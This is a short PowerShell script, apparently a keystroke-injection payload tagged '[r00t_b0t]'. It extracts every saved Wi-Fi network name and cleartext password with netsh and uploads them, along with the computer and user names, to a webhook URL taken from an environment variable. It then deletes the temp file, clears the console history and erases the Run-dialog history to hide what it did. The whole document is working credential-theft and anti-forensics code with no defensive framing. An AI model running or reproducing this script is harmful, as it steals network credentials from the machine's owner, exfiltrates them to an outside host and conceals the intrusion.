$wh=$env:WH
$f="$env:TEMP\~tmp$(Get-Random).txt"
netsh wlan show profiles|Select-String 'All User Profile'|%{$n=($_ -split ':')[1].Trim();$p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content');if($p){"$n : "+(($p -split ':')[1].Trim())}}|Out-File $f -Encoding UTF8
$h="[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME";$c=Get-Content $f -Raw;($h+"`n"+$c)|Out-File $f -Encoding UTF8
curl.exe -s -X POST $wh -F "payload_json={""content"":""[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME""}" -F "file1=@$f;type=text/plain"
Remove-Item $f -Force -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
